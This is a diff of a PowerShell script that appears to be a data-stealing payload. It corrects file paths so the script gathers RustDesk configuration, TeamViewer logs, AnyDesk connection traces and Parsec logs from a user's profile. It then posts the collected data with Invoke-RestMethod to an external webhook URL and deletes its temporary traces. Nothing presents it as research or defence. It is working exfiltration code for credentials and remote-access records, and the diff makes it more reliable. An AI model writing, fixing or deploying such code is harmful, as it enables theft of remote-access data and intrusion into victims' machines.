@@ -129,15 +129,15 @@ Remove-Item "$env:TEMP\FTPandFileSync-$ZIP" -r -Force -ErrorAction SilentlyConti
 New-Item -Path "$env:tmp/$FolderName/RemoteControl" -ItemType Directory
 
 # RustDesk
-if (Test-Path "$env:appdata\RuskDesk\config" -PathType Any) {
+if (Test-Path "$env:appdata\RustDesk\config" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/RemoteControl/RustDesk -ItemType Directory
-	Copy-Item "$env:appdata/RuskDesk/config" "$env:tmp/$FolderName/RemoteControl/RustDesk/config" -Recurse
+	Copy-Item "$env:appdata/RustDesk/config" "$env:tmp/$FolderName/RemoteControl/RustDesk/config" -Recurse
 }
 
 # TeamViewer
-if (Test-Path "$env:appdata\..\TeamViewer\Logs" -PathType Any) {
+if (Test-Path "$env:appdata\..\Local\TeamViewer\Logs" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/RemoteControl/TeamViewer -ItemType Directory
-	Copy-Item "$env:appdata/../TeamViewer/Logs" "$env:tmp/$FolderName/RemoteControl/TeamViewer/Logs" -Recurse
+	Copy-Item "$env:appdata/../Local/TeamViewer/Logs" "$env:tmp/$FolderName/RemoteControl/TeamViewer/Logs" -Recurse
 }
 
 # AnyDesk
@@ -147,7 +147,7 @@ if (Test-Path "$env:appdata\AnyDesk\connection_trace.txt" -PathType Any) {
 }
 
 # Parsec
-if (Test-Path"$env:appdata/Parsec/log.txt" -PathType Any) {
+if (Test-Path "$env:appdata/Parsec/log.txt" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/RemoteControl/Parsec -ItemType Directory
 	Copy-Item "$env:appdata/Parsec/log.txt" "$env:tmp/$FolderName/RemoteControl/Parsec/log.txt"
 }
@@ -167,7 +167,7 @@ $Body = @{
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
 
 Remove-Item "$env:TEMP\$FolderName\RemoteControl" -r -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\RemoteControl-$ZIP" -r -Force -ErrorAction SilentlyContinue
+#Remove-Item "$env:TEMP\RemoteControl-$ZIP" -r -Force -ErrorAction SilentlyContinue
 
 ############################################################################################################################################################
 
